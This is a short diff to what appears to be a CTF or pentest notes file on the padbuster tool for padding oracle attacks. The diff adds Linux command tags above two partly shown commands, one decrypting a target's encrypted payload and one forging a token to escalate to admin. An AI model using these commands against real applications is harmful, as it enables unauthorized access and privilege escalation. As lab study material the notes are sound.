@@ -5,6 +5,7 @@ Automated script for performing Padding Oracle attacks. Used when an application
 ## Commands Used
 
 ### Decrypting a value
+<!-- cmd: linux -->
 ```bash
 padbuster "http://$TARGET:8080/api/debug/ENCRYPTED_PAYLOAD" \
   "ENCRYPTED_PAYLOAD" \
@@ -14,6 +15,7 @@ Used on: **thenewyorkflankees**
 
 ### Encrypting a forged value
 If you know the plaintext format, you can forge a new encrypted token (e.g. escalating to admin).
+<!-- cmd: linux -->
 ```bash
 padbuster "http://$TARGET:8080/api/debug/ENCRYPTED_PAYLOAD" \
   "ENCRYPTED_PAYLOAD" \
